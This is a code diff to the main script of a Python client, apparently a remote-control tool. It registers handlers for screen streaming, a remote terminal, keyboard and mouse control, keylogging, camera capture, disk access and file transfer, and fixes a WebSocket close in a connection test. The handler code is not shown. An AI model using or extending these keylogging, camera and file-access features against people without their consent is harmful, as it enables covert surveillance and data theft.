@@ -109,8 +109,10 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from common.config import *
 from common.protocol import MsgType
 from client.core import ClientEngine
-from client.handlers import (handle_screenshot, handle_process, handle_terminal,
-                              handle_mouse, handle_keyboard, handle_keylog, handle_system_info)
+from client.handlers import (handle_screen_stream, handle_process, handle_terminal,
+                              handle_mouse, handle_keyboard, handle_keylog, handle_system_info,
+                              handle_camera, handle_disk, handle_file_transfer,
+                              handle_file_transfer_data, handle_file_manager)
 
 
 def get_local_ip():
@@ -491,6 +493,7 @@ def test_connection(server_addr, tls_enabled=False, tls_verify=True, ca_cert='')
         import websockets
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
+        ws = None
         try:
             ws = loop.run_until_complete(
                 asyncio.wait_for(
@@ -501,12 +504,14 @@ def test_connection(server_addr, tls_enabled=False, tls_verify=True, ca_cert='')
                     timeout=5,
                 )
             )
-            try:
-                loop.run_until_complete(ws.close())
-            except Exception:
-                pass
             _emit(f"      -> OK")
         finally:
+            # 确保关闭 WebSocket
+            if ws is not None:
+                try:
+                    loop.run_until_complete(ws.close())
+                except Exception:
+                    pass
             loop.close()
     except Exception as e:
         _emit(f"      -> FAIL  ({e})")
@@ -711,13 +716,18 @@ def main():
                           tls_verify=tls_verify, ca_cert=ca_cert)
 
     # ---- 注册功能模块 handler ----
-    engine.register_handler(MsgType.SCREENSHOT, handle_screenshot)
+    engine.register_handler(MsgType.SCREENSHOT, handle_screen_stream)  # 屏幕流和单次截图
     engine.register_handler(MsgType.PROCESS, handle_process)
     engine.register_handler(MsgType.TERMINAL, handle_terminal)
     engine.register_handler(MsgType.MOUSE, handle_mouse)
     engine.register_handler(MsgType.KEYBOARD, handle_keyboard)
     engine.register_handler(MsgType.KEYLOG, handle_keylog)
     engine.register_handler(MsgType.SYSTEM_INFO, handle_system_info)
+    engine.register_handler(MsgType.CAMERA, handle_camera)
+    engine.register_handler(MsgType.DISK, handle_disk)
+    engine.register_handler(MsgType.FILE_TRANSFER, handle_file_transfer)
+    engine.register_handler(MsgType.FILE_TRANSFER_DATA, handle_file_transfer_data)
+    engine.register_handler(MsgType.FILE_MANAGER, handle_file_manager)
 
     # ---- 运行 ----
     try:
